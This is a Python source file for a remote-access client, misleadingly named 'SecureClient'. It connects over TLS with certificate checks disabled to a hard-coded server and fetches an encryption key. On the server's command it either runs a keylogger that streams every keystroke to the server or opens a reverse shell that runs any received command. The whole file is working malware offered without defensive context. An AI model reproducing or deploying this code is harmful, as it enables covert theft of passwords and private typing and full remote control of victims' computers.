import socket
import ssl
import os
import requests
import subprocess
from cryptography.fernet import Fernet
from pynput import keyboard

class SecureClient:
    def __init__(self):
        self.server_ip = "192.168.204.129"
        self.server_port = 5555
        self.server_url = f"http://{self.server_ip}:5000/get_key"

        # SSL Context
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        # Retrieve encryption key
        response = requests.get(self.server_url)
        self.key = response.json()["key"].encode()
        self.cipher = Fernet(self.key)

    def start(self):
        """Establish a secure connection to the server."""
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.secure_client = self.context.wrap_socket(client)
        self.secure_client.connect((self.server_ip, self.server_port))

        # Receive choice from server
        choice = self.secure_client.recv(1024).decode()

        if choice == "1":
            self.keyLogger()
        elif choice == "2":
            self.reverseShell()
        else:
            self.secure_client.close()

    def keyLogger(self):

        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                char = str(key)

            encrypted_char = self.cipher.encrypt(char.encode())

            self.secure_client.send(encrypted_char)

        with keyboard.Listener(on_press=on_press) as l:
          l.join()

    def reverseShell(self):
        while True:
            command = self.secure_client.recv(4096).decode()
            try:
              if command.lower() == "exit":
                  break
              output = subprocess.run(command, shell=True, capture_output=True, text=True)
              response = output.stdout + output.stderr
            except Exception as e:
              self.secure_client.send(f"Error: {str(e)}".encode())
            self.secure_client.send(response.encode())

if __name__ == "__main__":
    client = SecureClient()
    client.start()

